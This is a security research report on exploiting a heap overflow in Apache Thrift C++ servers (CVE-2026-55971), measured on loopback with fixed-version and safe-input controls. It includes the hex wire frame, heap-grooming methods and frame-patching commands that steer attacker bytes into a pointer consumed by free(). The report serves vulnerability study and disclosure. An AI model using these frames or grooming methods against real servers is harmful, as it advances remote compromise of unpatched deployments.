# thrift2shell — live loopback ZLIB frame against real Thrift C++ servers

2026-11-23, first target wake. CVE-2026-55971 / GHSA-gwj4-q93m-wwqc.
All sockets are `127.0.0.1`; no external host was contacted. The earlier
rungs 1-4 were measured on four verbatim `untransform()` slices called
directly with stubbed object state (`reports/frontier-thrift2shell.md`).
This report records the first run on **unmodified upstream Thrift bytes**:
a real `TSimpleServer`, `THeaderTransport` framing parser, `TSocket`
listener, ZLIB transform and a separate client process on loopback.

## Build and provenance

Provisioning fetches only (GitHub release tag archives):

| Source | Archive SHA-256 | Built `THeaderTransport.cpp` SHA-256 |
|---|---|---|
| `v0.23.0` | `087ba9517063c8252e9e7fb4e3891a9fd85e20af80e0309e2276eff16791d75c` | `b2c85baefb0db672b40e80ecb493f7f78757c22ffd97e1608e9e200871e7737c` |
| `v0.24.0` | `d3a60676b1df3fb9850f6ce1e8a3df9a0efac036ceb4bce8ce46ee3eca735d2d` | `d3e62f54187bf9791b64ccddab87142db7736cc6a7ba99bfcc680056ec3667aa` |

Both built source hashes equal the frontier pins in
`lab/frontier/thrift2shell/PROVENANCE.md`; no source was edited. Build:

```sh
cd lab/frontier/thrift2shell/live
cmake -S thrift-0.23.0 -B build-asan-023 -G Ninja \
  -DBUILD_COMPILER=OFF -DBUILD_TESTING=OFF -DBUILD_TUTORIALS=OFF \
  -DBUILD_CPP=ON -DWITH_ZLIB=ON -DWITH_OPENSSL=OFF -DWITH_LIBEVENT=OFF \
  -DWITH_C_GLIB=OFF -DWITH_PYTHON=OFF -DWITH_NODEJS=OFF -DWITH_AS3=OFF \
  -DBUILD_SHARED_LIBS=OFF -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS='-fsanitize=address -fno-omit-frame-pointer' \
  -DCMAKE_CXX_FLAGS='-fsanitize=address -fno-omit-frame-pointer' \
  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address'
ninja -C build-asan-023 -j2 thrift thriftz
g++ -std=c++17 -g -O1 -fsanitize=address -fno-omit-frame-pointer \
  -I thrift-0.23.0/lib/cpp/src -I build-asan-023 live.cpp \
  build-asan-023/lib/libthriftzd.a build-asan-023/lib/libthriftd.a \
  -lz -lpthread -o live-vuln
```

`live-fixed` uses the same commands with `0.24.0` / `build-asan-024`.
`build-plain-023` and `live-plain` omit sanitizers for the heap-layout run.
The reproduction script `live/run-live.sh` rebuilds nothing; it runs the
attack, fixed control and safe control and keeps logs in `live/results/`.

## Server and wire input

`live/live.cpp` runs a `TSimpleServer` bound to `127.0.0.1:PORT` with
`THeaderTransportFactory` and `TBinaryProtocolFactory`; its processor calls
`readMessageBegin()`, the real entry point into `readFrame()` and
`untransform()`. A separate client opens a `TSocket`, calls
`setTransform(THeaderTransport::ZLIB_TRANSFORM)` and writes a Thrift message
with a 700-byte marker payload (markers `41/5a/7a/3c/7b/42/7b` at payload
offsets `0/16/32/64/128/256/699`).

The client's tap transport captured the exact 72-byte wire frame in
`live/wire.bin`; `live/raw-client.py` replays those bytes with only Python's
`socket`, no Thrift library:

```
00000000  00 00 00 44 0f ff 00 00  00 00 00 00 00 01 00 01  |...D............|
00000010  01 00 78 9c 6b 60 64 60  64 60 60 60 4b 2c 29 49  |..x.k`d`d```K,)I|
```

Frame length 68, HEADER_MAGIC `0x0fff0000`, seq 0, headerSize 1 (one 4-byte
word: binary protocol, one transform, ZLIB id 1, padding), then 54 bytes of
zlib data beginning `78 9c`. The decompressed frame is 726 bytes.

## Observed results

`./run-live.sh` (2026-11-23 10:18Z):

- `vuln-attack`: client rc 0, `SENT uncompressed_payload=700 transform=ZLIB`.
  The **server** faults with ASan `heap-buffer-overflow`, `WRITE of size 726`
  at `THeaderTransport.cpp:301` in `untransform`, reached from
  `readHeaderFormat:260` → `readFrame:162` → `TFramedTransport::readSlow` →
  `TBinaryProtocol::readMessageBegin` → `ReadOnceProcessor::process` →
  `TConnectedClient::run` → `TSimpleServer::serve`. Destination is a 68-byte
  `rBuf_` allocated at `ensureReadBuffer:66` from the received frame length.
  Server rc 1. Full trace: `live/results/vuln-attack-server.log`.
- `fixed-attack` (v0.24.0 server, same client bytes): `PROCESS_REACHED
  name=attack seqid=1`, zero ASan lines. `live/results/fixed-attack-server.log`.
- `vuln-safe` (4-byte payload): `PROCESS_REACHED`, zero ASan lines.
- Raw replay to ASan servers: vulnerable faults at pinned `:301`; fixed
  processes the message with zero ASan lines
  (`live/results/raw-vuln.log`, `raw-fixed.log`).
- Three plain-build (no ASan) attack runs all end at server teardown with
  glibc `munmap_chunk(): invalid pointer`; two fixed controls stay clean
  (`live/results/plain-attack-*.log`, `plain-fixed-*.log`).

## Real receive-buffer neighbors (plain build, gdb)

`live/gdb-plain.gdb` breaks at pinned `:301` and `:307` in the plain server.
Observed before the copy:

```
ptr=rbuf+14, sz=726, rbufsz=68, tbuf=rbuf+80, tbufsz=1024
rBuf chunk header: prev_size=0, size=0x51
tBuf chunk header: prev_size=0xffb89cb2, size=0x411
```

The next heap chunk is the transform buffer, 80 bytes after `rBuf_`. The
copy destination starts 66 bytes before `tBuf_`, so the write crosses the
tBuf chunk's `prev_size` and `size` fields. After the copy:

```
tBuf chunk prev_size = 0x7a42424242424242
tBuf chunk size      = 0x4242424242424242
```

`0x7a` is the chosen marker from payload offset 32; the rest is `0x42`
filler. glibc's `memcpy` still completes — the consumer does not fault at
the write — and the corrupted chunk size later aborts the process in
`munmap_chunk()`. This is the measured behavior of the actual consumer on
this host, not an inference from the harness sink.

## Persistent connection: receive buffer reallocated after the transform buffer

`live/live.cpp` also has a `client-multi` mode: a small safe frame followed
by the attack frame on the **same** socket, with the processor consuming each
message completely. `live/run-multi.sh` replays it against the plain build
under gdb. Both `untransform()` calls hit the pinned breakpoints:

- frame 1: `sz=30`, `rbuf=rbuf1`, `tbuf=rbuf1+64`, no overflow;
- frame 2: `sz=726`, `rbuf` is a **new** 68-byte allocation, now *after* the
  persistent transform buffer (`tbuf = rbuf - 1040`, i.e. tBuf ends 16 bytes
  before the new rBuf). The copy no longer touches tBuf; it runs into the
  heap region following rBuf and the server aborts with
  `malloc(): corrupted top size`.

Observed trace: `live/results/gdb-multi.log`. The neighbor order changes with
connection lifetime, but this run still reaches only heap metadata: no code
pointer or return address lies in the written range. For the single-frame
layout, observed `tbuf - rbuf` was 64-80 bytes; the transform gate caps the
decompressed length below 1024, so the write ends around `rbuf+1037` — inside
the 1024-byte tBuf user region. Reaching an object past tBuf would require a
different allocation order or a second allocation inside the copy window,
which was not produced here.

The KV-header lane below produced a different allocation order in which the
copy lands on live C++ objects rather than `tBuf_`.

## KV-header grooming: a chosen pointer reaches free() on live bytes (2026-11-23 W144)

The earlier heap study showed the copy landing in heap metadata. This wake
added attacker-controlled THeader KEYVALUE headers to place live C++ objects
inside the copy window. `live/make-kv-frame.py` builds a wire frame from the
captured 726-byte message with four KEYVALUE headers (32-byte heap-allocated
keys and values), a 68-word header, and a compressed section padded to 160
bytes so every variant keeps the same frame length (442 bytes) and allocation
sizes. `--patch OFFSET=HEX` replaces chosen decompressed bytes. Frames:

| Frame | SHA-256 | Purpose |
|---|---|---|
| `kvbase160.bin` | `f4e1c878...6bebbd94` | layout baseline, no patches |
| `kv-ptr14.bin` | `d6d47e19...e073ce34ba0e6ee` | chosen pointer `0x00007f4242424240` |
| `kv-ptr-alt.bin` | `34f68bf1...e38516b158` | different pointer `0x00007a5a42424240` |
| `kv-safe14.bin` | `8fccc955...ec267bc2a544970fd9ee483e96` | original pointers restored |

Baseline layout under the plain build, observed with `live/gdb-kv.gdb`:
`rbuf=0x5555555bc0d0`, `ptr=rbuf+282`, `tbuf=rbuf+1392`, `rbufsz=442`.
The 726-byte copy ends at `rbuf+1008` — 384 bytes short of `tBuf_`, so it does
not touch the transform chunk. It crosses two freed 0x30 tcache entries at
`rbuf+0x1d0` and `rbuf+0x200` and three 0x71 `std::map` nodes at
`rbuf+0x230`, `rbuf+0x300` and `rbuf+0x3d0`, all created by the header parser
before `untransform()` (`readHeaderFormat:239-254`, pinned
`THeaderTransport.cpp.v0.23.0`). A gdb heap dump of the exact window is in
`live/results/kv-post-heap.bin` (pre-copy) and `kv-post-after.bin` (post-copy).

`kv-ptr14.bin` restores the overwritten tcache links, chunk sizes and tree
links so the only live pointers left corrupt are the four `std::string` data
pointers in the first two map nodes, set to bytes at decompressed offsets
310, 342, 518 and 550. Replays:

- `live/run-kv-gdb.sh kv-ptr14.bin gdb-kv-post.gdb PORT 1`: server reaches
  `PROCESS_REACHED`, then SIGSEGV in
  `__GI___libc_free (mem=0x7f4242424240) at malloc.c:3375`, called from
  `~map` in `THeaderTransport::~THeaderTransport`. Reproduced twice; the
  alternative frame faults at `mem=0x7a5a42424240`, so the fault address
  follows the wire bytes. Logs: `results/kv-gdb-kv-ptr14.log`,
  `results/kv-gdb-kv-ptr-alt.log`.
- `live/run-kv-pointer.sh vuln PORT kv-ptr14.bin` (`setarch -R`, no gdb):
  server rc 139; fixed v0.24.0 with the same frame reaches `PROCESS_REACHED`
  and stays clean until the script's 8-second timeout (rc 124). Logs:
  `results/kv-pointer-vuln-kv-ptr14.log`, `results/kv-pointer-fixed-kv-ptr14.log`.
- Same frame against the ASan build: `WRITE of size 726` at
  `THeaderTransport.cpp:301` (`results/kv-pointer-asan-kv-ptr14.log`).
- `kv-safe14.bin` restores the original string pointers and keeps every
  grooming patch: the vulnerable server aborts in `munmap_chunk(): invalid
  pointer` instead, with no chosen-address fault
  (`results/kv-pointer-vuln-kv-safe14.log`).

Conditions: the frames embed exact glibc addresses and tcache `PROTECT_PTR`
values from this build; replay is deterministic with ASLR disabled (gdb's
default, or `setarch -R`). Whether the same control survives ASLR, other
glibc versions or a different allocator is UNKNOWN. No code pointer, return
address, ROP chain, command, marker side effect or witness verdict is present.

## Grade and ceiling

New evidence supports rungs 1-4 on living bytes: ASan write at the pinned
line, plain glibc aborts, placed bytes in adjacent heap metadata, and now
attacker-chosen bytes becoming a heap pointer consumed by `free()` in the
live server, with the fault address following the wire bytes. The control is
measured under ASLR-disabled replay with exact glibc addresses and tcache
link bytes embedded in the frame; ASLR-on and allocator-portable control are
UNKNOWN. Rung 5 is **not** supported: no chosen bytes in a code pointer or
return address, no ROP, no command, no benign marker side effect and no
independent witness verdict. The advisory's `AV:N` vector is demonstrated as
a loopback wire path in this lab build, not as an externally reachable
configuration. The fixed build and the safe-input control do not produce the
chosen-address fault.

## ASLR-on partial pointer overwrite (2026-11-23 W145)

The `kv-ptr14.bin` pointer control embeds whole glibc addresses and therefore
needs ASLR off. To test whether wire bytes still control a pointer when ASLR
is on, the copy was made to **end inside** a live `std::string` data pointer:
the high bytes then remain the process's real heap address and only the low
two bytes come from the frame. In the four-KV/32-byte-string layout the first
such pointer is at `rbuf+592`, the copy starts at `rbuf+282`, so a 312-byte
decompressed payload ends at `rbuf+594`. `make-kv-frame.py --plain-len 312`
truncates the message, and the string-length field at decompressed offset 21
is set to 284 so `readMessageBegin()`/the processor still complete. The
compressed section remains padded to 160 bytes, preserving frame length 442
and the allocation sizes.

Replays used `gdb-kv-partial.gdb` with `set disable-randomization off`
(ASLR on) against the committed plain v0.23.0 server on 127.0.0.1:

| Frame | Observed `rbuf` | Observed pointer at `rbuf+592` |
|---|---|---|
| `kv-partial-4240.bin`, run 1 | `0x5875888eb0d0` | `0x5875888e4240` |
| `kv-partial-4240.bin`, run 2 | `0x5f9e4fed20d0` | `0x5f9e4fed4240` |
| `kv-partial-c3a0.bin` | `0x5d037cc440d0` | `0x5d037cc4c3a0` |
| `kv-partial-safe.bin` | `0x5d85843e00d0` | `0x5d85843ec370` |

`PROCESS_REACHED name=attack seqid=1` in all four. The high bytes change with
the randomized heap base while the low 16 bits follow the wire bytes; the
safe frame preserves the original low word. No absolute address for the
target pointer is embedded in the frame.

Ceiling of this experiment: every one of these runs later aborts in
`tcache_get_n` from `malloc(32)`, because the same 312-byte template also
overwrites two freed 0x30 tcache link fields with address values captured
from an ASLR-disabled layout. The chosen pointer is therefore **not** yet
consumed by `free()` with ASLR on; those earlier ASLR-off frames remain the
only observation of a wire-chosen free argument. This is rung 4 mechanics on
living bytes, not RCE: no code pointer, return address, command or marker
side effect.

## ASLR-on pointer control: wire-chosen low word reaches `free()` (2026-11-23 W145)

The previous section's partial-overwrite frames still aborted in
`malloc(32)` before the destructor: after `PROCESS_REACHED`, the lab server's
`TFramedTransport::close()` flushes an error response, and the 312-byte copy
had overwritten two 0x30 tcache link fields with address values captured from
an ASLR-disabled layout. To isolate the primitive from that teardown write,
`live-noflush.cpp` (a copy of `live.cpp` plus `SinkTransport`/
`SinkHeaderFactory` and mode `server-noflush`) discards writes, flushes and
close; reads and the upstream `THeaderTransport` untransform path are
unchanged. `live-noflush` is a separate binary; the original `live-plain`
used for the earlier evidence is untouched. Frame generation and replay:

```sh
cd lab/frontier/thrift2shell/live
g++ -std=c++17 -g -O1 -I thrift-0.23.0/lib/cpp/src -I build-plain-023 \
  live-noflush.cpp build-plain-023/lib/libthriftzd.a build-plain-023/lib/libthriftd.a \
  -lz -lpthread -o live-noflush
# fixed control: same flags with thrift-0.24.0 / build-plain-024 -> live-noflush-fixed
python3 make-kv-frame.py kv-partial-4240.bin --base kv-ptr14.bin \
  --plain-len 312 --patch 21=0000011c --patch 310=4042 --pad-compressed 160
NOFLUSH_SERVER=./live-noflush ./run-kv-noflush.sh \
  kv-partial-4240.bin gdb-kv-partial.gdb PORT 1
```

Compiler-flag note from the witness's independent replay of the earlier lane
(chat 2533): the committed `live-plain` DWARF records `-g -O0`; their `-O1`
plain rebuild shifted `rbuf` by `0x8000` and missed the frame. The no-flush
binaries used here were compiled `-O1` against `build-plain-023` and matched
this frame. Layout is flag-sensitive: verify `ptr-rbuf` at `:301` before
reusing the decompressed offsets.

`gdb-kv-partial.gdb` sets `disable-randomization off`, so ASLR is on. The
frame contains no absolute address for the target pointer: the copy ends at
`rbuf+594`, inside the 8-byte string pointer at `rbuf+592`, so its high six
bytes stay the process's heap address and only the low two come from the
frame (decompressed offsets 310/311). Observed with the vulnerable v0.23.0
no-flush server:

| Frame | `rbuf` / post-copy pointer | `free()` argument | Result |
|---|---|---|---|
| `kv-partial-4240.bin`, run A | `0x5ae70a0a6f..` / `0x5ae70a0a4240` | `0x5ae70a0a4240` | `free(): invalid pointer` |
| `kv-partial-4240.bin`, run B | `0x6307eaac81f0` / `0x6307eaac4240` | `0x6307eaac4240` | `free(): invalid pointer` |
| `kv-partial-c3a0.bin` | `0x55a0d6ad11f0` / `0x55a0d6adc3a0` | `0x55a0d6adc3a0` | `free(): invalid pointer` |
| `kv-partial-safe.bin` | `0x608a7e4fb1f0` / `0x608a7e4fc370` | `0x608a7e4fc370` | original low word |

All four printed `PROCESS_REACHED name=attack seqid=1`. The backtrace for the
chosen pointer is `__GI___libc_free (mem=0x6307eaac4240)` ← `std::string`
destructor ← `std::pair` destructor, i.e. the header map's teardown. The high
bytes change between runs with the randomized heap while the low 16 bits
follow the wire bytes; the safe frame leaves the original low word. A
v0.24.0 no-flush control built from the same source and replayed with the
same frame printed `PROCESS_REACHED`, had no `4240` in its log, and stayed
alive until the 25-second debugger timeout (`results/kv-noflush-live-noflush-fixed-kv-partial-4240.log`).

This is still rung 4: a wire-chosen **heap pointer** is consumed by `free()`
with ASLR on, in a lab harness that discards server writes. The low 16 bits
are chosen; the high bits come from the process. No code pointer, return
address, ROP, command, marker side effect or witness verdict is present.
The no-flush harness change is disclosed and affects only teardown writes,
not the vulnerable read/copy path.
